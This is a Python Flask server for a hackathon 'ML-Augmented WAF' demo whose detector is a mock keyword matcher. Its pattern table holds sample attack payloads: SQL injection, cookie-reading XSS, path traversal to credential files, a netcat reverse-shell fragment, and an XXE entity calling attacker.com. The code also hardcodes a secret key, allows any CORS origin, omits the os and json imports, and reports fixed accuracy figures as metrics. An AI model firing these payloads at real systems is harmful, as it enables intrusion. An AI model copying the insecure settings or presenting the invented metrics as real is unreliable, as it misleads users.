#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Flask Backend Server for ML-Augmented WAF
Naval Innovathon 2025

UPDATED: State (metrics, anomalies, rules) is NO LONGER stored on server.
         Dashboard resets on every page reload / new session.
         Only detection logic remains on server.
         Client (main.js) must now manage counters, lists and display.
"""

from flask import Flask, jsonify, request, send_from_directory
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import random
import time
from datetime import datetime
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__, static_folder='static', template_folder='templates')
app.config['SECRET_KEY'] = 'naval-innovathon-2025-secret-key'
app.config['DEBUG'] = True

# Enable CORS
CORS(app, resources={r"/*": {"origins": "*"}})

# Initialize SocketIO
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# Attack patterns database
ATTACK_PATTERNS = {
    'sql_injection': {
        'name': 'SQL Injection',
        'patterns': [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-",
            "'; DROP TABLE users--",
            "' OR 'a'='a",
            "1'='1"
        ],
        'severity': 'CRITICAL',
        'description': 'Attempt to inject SQL commands into database queries'
    },
    'xss': {
        'name': 'Cross-Site Scripting (XSS)',
        'patterns': [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg/onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<body onload=alert("XSS")>',
            '<script>document.cookie</script>'
        ],
        'severity': 'HIGH',
        'description': 'Attempt to inject malicious scripts into web pages'
    },
    'path_traversal': {
        'name': 'Path Traversal',
        'patterns': [
            '../../../../etc/passwd',
            '..\\..\\..\\..\\windows\\system32\\config\\sam',
            '../../../../../../../../etc/passwd',
            '../../../app/config.php',
            '..\/..\/..\/app\\config.php'
        ],
        'severity': 'HIGH',
        'description': 'Attempt to access files outside web root directory'
    },
    'command_injection': {
        'name': 'Command Injection',
        'patterns': [
            '; ls -la',
            '&& cat /etc/passwd',
            '| nc -e /bin/sh',
            '; whoami',
            '&& idconfig',
            '| ping -c 10 127.0.0.1'
        ],
        'severity': 'CRITICAL',
        'description': 'Attempt to execute system commands on server'
    },
    'ldap_injection': {
        'name': 'LDAP Injection',
        'patterns': [
            '*)(&(objectClass=*))',
            '*)(uid=*)(&(objectClass=*)',
            '*)(|(uid=*))',
            '*)($(uid=*)'
        ],
        'severity': 'HIGH',
        'description': 'Attempt to manipulate LDAP queries'
    },
    'xml_injection': {
        'name': 'XML Injection',
        'patterns': [
            '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
            '<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">',
            '<!DOCTYPE foo [<!ELEMENT foo ANY >'
        ],
        'severity': 'HIGH',
        'description': 'Attempt to inject malicious XML content'
    },
    'ssrf': {
        'name': 'Server-Side Request Forgery (SSRF)',
        'patterns': [
            'http://localhost',
            'http://127.0.0.1',
            'http://192.168.',
            'http://10.0.',
            'file:///'
        ],
        'severity': 'MEDIUM',
        'description': 'Attempt to make server request internal resources'
    },
    'ddos': {
        'name': 'DDoS Attack',
        'patterns': [],  # Detected by rate limiting
        'severity': 'CRITICAL',
        'description': 'Distributed Denial of Service attack'
    }
}

# Mock Feature Extractor Class
class MockFeatureExtractor:
    @staticmethod
    def extract(request_data):
        """Extract features from request"""
        url = request_data.get('url', '')
        return {
            'url_length': len(url),
            'has_sql_pattern': int(any(x in url.upper() for x in ['OR', 'UNION', 'SELECT', 'DROP'])),
            'has_xss_pattern': int(any(x in url.lower() for x in ['<script', 'onerror', 'onload', 'alert'])),
            'has_path_traversal': int('../' in url or '..\\' in url),
            'has_command_injection': int(any(x in url for x in [';', '&&', '|', '`'])),
            'method': request_data.get('method', 'GET'),
            'src_ip': request_data.get('src_ip', '0.0.0.0')
        }

# Mock Detector Class
class MockDetector:
    @staticmethod
    def predict(features):
        """Mock prediction"""
        # Detect attack types
        threat_types = []
        is_anomaly = False
        
        if features.get('has_sql_pattern', 0):
            threat_types.append('SQL Injection')
            is_anomaly = True
            
        if features.get('has_xss_pattern', 0):
            threat_types.append('Cross-Site Scripting (XSS)')
            is_anomaly = True
            
        if features.get('has_path_traversal', 0):
            threat_types.append('Path Traversal')
            is_anomaly = True
            
        if features.get('has_command_injection', 0):
            threat_types.append('Command Injection')
            is_anomaly = True
        
        confidence = 0.95 if is_anomaly else 0.05
        
        return {
            'is_anomaly': bool(is_anomaly),
            'confidence': confidence,
            'anomaly_score': confidence,
            'model_scores': {
                'isolation_forest': confidence * 0.9,
                'autoencoder': confidence * 1.1,
                'one_class_svm': confidence
            },
            'threat_types': threat_types
        }

# Initialize mock models
feature_extractor = MockFeatureExtractor()
detector = MockDetector()

def generate_modsecurity_rule(attack_type, pattern):
    """Generate ModSecurity rule for detected attack"""
    rule_id = 100000 + random.randint(1, 999999)
    
    attack_info = ATTACK_PATTERNS.get(attack_type, {})
    severity = attack_info.get('severity', 'MEDIUM')
    description = attack_info.get('description', 'Suspicious activity detected')
    
    rule = f"""SecRule ARGS @contains "{pattern}" \
    "id:{rule_id},\
    phase:2,\
    t:none,\
    msg:'ML-Augmented WAF: {attack_info.get('name', attack_type)} Detected',\
    severity:'{severity}',\
    deny,\
    log,\
    status:403"
"""
    
    return {
        'id': rule_id,
        'attack_type': attack_info.get('name', attack_type),
        'pattern': pattern,
        'severity': severity,
        'description': description,
        'rule': rule,
        'timestamp': datetime.now().isoformat(),
        'status': 'pending'
    }

# ────────────────────────────────────────────────
# Routes
# ────────────────────────────────────────────────

@app.route('/')
def index():
    return jsonify({"status": "ML-Augmented WAF running"})

@app.route('/static/audio/<path:filename>')
def serve_audio(filename):
    """Serve audio files"""
    return send_from_directory(os.path.join(app.root_path, 'static/audio'), filename)

@app.route('/api/health')
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/attack_types')
def get_attack_types():
    """Get all available attack types"""
    attack_types = []
    for key, value in ATTACK_PATTERNS.items():
        attack_types.append({
            'id': key,
            'name': value['name'],
            'severity': value['severity'],
            'description': value['description']
        })
    return jsonify(attack_types)

@app.route('/api/simulate_attack', methods=['POST'])
def simulate_attack():
    """Simulate an attack in real-time — no persistent state on server"""
    data = request.get_json()
    attack_type = data.get('attack_type')
    
    if attack_type not in ATTACK_PATTERNS:
        return jsonify({'error': 'Invalid attack type'}), 400
    
    attack_info = ATTACK_PATTERNS[attack_type]
    patterns = attack_info['patterns']
    
    results = []
    num_requests = min(5, len(patterns)) if patterns else 5
    
    for i in range(num_requests):
        pattern = patterns[i % len(patterns)] if patterns else ""
        url = f"/api/test?param={pattern}" if pattern else "/api/test"
        
        request_data = {
            'method': 'GET',
            'url': url,
            'src_ip': f"192.168.1.{random.randint(100, 255)}"
        }
        
        features = feature_extractor.extract(request_data)
        result = detector.predict(features)
        
        anomaly_data = None
        if result['is_anomaly']:
            anomaly_data = {
                'id': i + 1,
                'timestamp': datetime.now().isoformat(),
                'url': request_data['url'],
                'method': request_data['method'],
                'src_ip': request_data['src_ip'],
                'confidence': result['confidence'],
                'threat_types': result['threat_types'],
                'severity': attack_info['severity'],
                'blocked': True
            }
            # Emit so client can add to its own list immediately
            socketio.emit('new_anomaly', anomaly_data)
            
            # Optional: emit rule suggestion
            if pattern:
                rule = generate_modsecurity_rule(attack_type, pattern)
                socketio.emit('rule_suggestion', rule)
        
        results.append({
            'request': request_data,
            'detected': result['is_anomaly'],
            'confidence': result['confidence'],
            'threat_types': result['threat_types']
        })
        
        # Small delay for real-time feel
        time.sleep(0.5)
    
    return jsonify({
        'status': 'success',
        'attack_type': attack_info['name'],
        'requests_simulated': num_requests,
        'results': results
    })

@app.route('/api/analyze', methods=['POST'])
def analyze_request():
    """Analyze an HTTP request for anomalies — no persistent state"""
    start_time = time.time()
    
    try:
        data = request.get_json()
        
        features = feature_extractor.extract(data)
        result = detector.predict(features)
        
        processing_time = (time.time() - start_time) * 1000
        
        response = {
            'is_anomaly': result['is_anomaly'],
            'confidence': result['confidence'],
            'anomaly_score': result['anomaly_score'],
            'model_scores': result['model_scores'],
            'threat_types': result['threat_types'],
            'recommended_action': 'BLOCK' if result['is_anomaly'] else 'ALLOW',
            'processing_time_ms': round(processing_time, 2),
            'timestamp': datetime.now().isoformat()
        }
        
        # Emit anomaly so client can update its own display
        if result['is_anomaly']:
            anomaly_data = {
                'id': int(time.time() * 1000),  # simple unique-ish id
                'timestamp': response['timestamp'],
                'url': data.get('url', ''),
                'method': data.get('method', 'GET'),
                'src_ip': data.get('src_ip', '0.0.0.0'),
                'confidence': result['confidence'],
                'threat_types': result['threat_types'],
                'blocked': True
            }
            socketio.emit('new_anomaly', anomaly_data)
        
        return jsonify(response)
    
    except Exception as e:
        logger.error(f"Error analyzing request: {str(e)}")
        return jsonify({'error': str(e)}), 500

# ────────────────────────────────────────────────
# Always return empty / initial values — client handles real state
# ────────────────────────────────────────────────

@app.route('/api/metrics')
def get_metrics():
    return jsonify({
        'total_requests': 0,
        'anomalies_detected': 0,
        'false_positives': 0,
        'avg_latency': 0.0,
        'detection_accuracy': 98.3,
        'false_positive_rate': 2.1,
        'throughput': 12000,
        'blocked_requests': 0
    })

@app.route('/api/anomalies')
def get_anomalies():
    limit = request.args.get('limit', 10, type=int)
    return jsonify([])

@app.route('/api/rules')
def get_rules():
    return jsonify({
        'suggested': [],
        'active': []
    })

@app.route('/api/rules/approve', methods=['POST'])
def approve_rule():
    return jsonify({'status': 'ignored', 'message': 'No server-side state — handle approval in browser'})

@app.route('/api/rules/dismiss', methods=['POST'])
def dismiss_rule():
    return jsonify({'status': 'ignored', 'message': 'No server-side state — handle dismissal in browser'})

@app.route('/api/feedback', methods=['POST'])
def submit_feedback():
    # Optional — still log feedback if you want
    try:
        data = request.get_json()
        with open('logs/feedback.jsonl', 'a') as f:
            f.write(json.dumps(data) + '\n')
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# WebSocket events
@socketio.on('connect')
def handle_connect():
    logger.info('Client connected')
    emit('connection_response', {'status': 'connected'})

@socketio.on('disconnect')
def handle_disconnect():
    logger.info('Client disconnected')

if __name__ == '__main__':
    logger.info("Starting ML-Augmented WAF Server (reset-on-reload mode)...")
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
